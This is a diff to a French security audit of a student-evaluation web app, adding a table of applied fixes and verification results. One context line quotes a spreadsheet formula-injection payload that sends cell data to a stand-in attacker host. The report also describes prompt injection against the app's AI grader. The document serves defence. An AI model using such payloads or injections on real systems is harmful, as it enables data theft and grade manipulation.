@@ -7,6 +7,8 @@
 
 **Mise à jour du 2026-09-25 :** le risque résiduel lié au stockage du JWT en `localStorage` (facteur aggravant de toute XSS future) est désormais documenté dans le [README](README.md) (ligne « Authentification » du tableau + puce « Compromis de sécurité connu » dans « Choix d'architecture »). Pas de changement de code : le stockage lui-même reste à traiter si le projet évolue vers un déploiement same-site (cookie `HttpOnly`).
 
+**Mise à jour du 2026-09-25 (bis) :** les constats 3 à 8 sont traités (le 4 est atténué, pas éliminé) — voir « Correctifs appliqués (2026-09-25) ». Reste ouvert : le stockage du JWT en `localStorage`.
+
 ---
 
 ## Résumé
@@ -130,6 +132,23 @@ Un étudiant nommé par exemple `=HYPERLINK("http://evil.example/steal?x="&A2,"c
 **Correctif :** [StatisticsTab.jsx:298-312](frontend/src/features/pages/Evaluation/tabs/StatisticsTab.jsx#L298-L312) — `csvEscape` préfixe désormais d'une apostrophe toute valeur commençant par `=`, `+`, `-`, `@`, tabulation ou retour chariot, avant l'échappement RFC 4180 existant. Un nom d'étudiant du type `=HYPERLINK(...)` est donc exporté comme texte littéral (`'=HYPERLINK(...)`) plutôt que comme formule.
 
 **Vérification :** build frontend (`npm run build`) et lint (`oxlint`) passent sans erreur sur le fichier modifié. Pas de suite de tests frontend existante pour ce fichier (le projet n'a pas de test runner côté frontend, seulement `oxlint` + build).
+
+---
+
+## Correctifs appliqués (2026-09-25)
+
+| # | Constat | Correctif | Fichiers |
+|---|---|---|---|
+| 3 | Pas de rate limit sur `/api/pdf/extract` | Limiteur 20 requêtes / 15 min / IP, comme `/api/ai/generate-evaluation` | [pdf.routes.js](backend/src/routes/pdf.routes.js) |
+| 4 | Injection de prompt dans la correction IA | Réponse étudiante isolée entre `<reponse_etudiant>…</reponse_etudiant>` + consigne explicite de la traiter comme donnée. **Atténué, pas éliminé** : un LLM peut toujours être influencé ; la relecture enseignant avant publication reste le vrai garde-fou. | [grading.service.js](backend/src/services/grading.service.js) |
+| 5 | HTML non échappé dans les emails | `escapeHtml()` sur `firstName`, `evaluationTitle` et `resetLink` | [email.service.js](backend/src/services/email.service.js) |
+| 6 | `GET /api/ai/test` publique | Route et handler supprimés | [ai.routes.js](backend/src/routes/ai.routes.js), [ai.controller.js](backend/src/controllers/ai.controller.js) |
+| 7 | Pas d'en-têtes de sécurité | `helmet()` ajouté avant CORS (`helmet@^8`) | [app.js](backend/src/app.js) |
+| 8 | `xlsx-latest.tgz` non épinglé | Épinglé sur `xlsx-0.20.3.tgz` (le lockfile contient désormais aussi le hash d'intégrité) | [package.json](backend/package.json) |
+
+**Vérification :** suite backend `130 passed` (3 nouveaux tests : `email.service.test.js` ×2 pour l'échappement, 1 dans `grading.service.test.js` pour l'isolation du prompt). Test à chaud de l'app : préflight CORS depuis `https://miralamana.github.io` toujours accepté (204), en-têtes `X-Content-Type-Options: nosniff` / `Referrer-Policy: no-referrer` présents, `X-Powered-By` supprimé, `/api/ai/test` → 404, `/api/pdf/extract` → 429 à partir de la 21ᵉ requête.
+
+**Non vérifié :** le déploiement Render de ces changements (pas d'accès au dashboard) ; `helmet` n'a été testé que localement — à confirmer en ligne après déploiement (connexion + un export/aperçu de fichier).
 
 ---
 
